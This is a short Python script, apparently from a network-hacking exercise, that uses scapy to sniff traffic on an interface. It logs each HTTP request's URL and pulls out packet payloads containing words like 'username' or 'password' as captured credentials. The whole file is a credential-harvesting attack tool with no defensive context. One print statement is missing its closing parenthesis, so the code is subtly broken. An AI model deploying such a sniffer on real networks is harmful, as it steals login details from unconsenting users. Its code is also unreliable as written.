#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface = interface, store = False, prn = processSniffedPacket)

def getURL(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path

def getLoginInfo(packet):
	if packet.haslayer(scapy.Raw):
		load = str(packet[scapy.Raw].load)
		keywords = ["username", "user", "login", "password", "pass"]
		for keyword in keywords:
			if keyword in load:
				return load

def processSniffedPacket(packet):
	if packet.haslayer(http.HTTPRequest):
		url = getURL(packet)
		print("[+] HTTP Request >> " + str(url)

		loginInfo = getLoginInfo(packet)
		if loginInfo:
			print("\n\n[+] Possible username/password > " + str(loginInfo) + "\n\n")

sniff("eth0")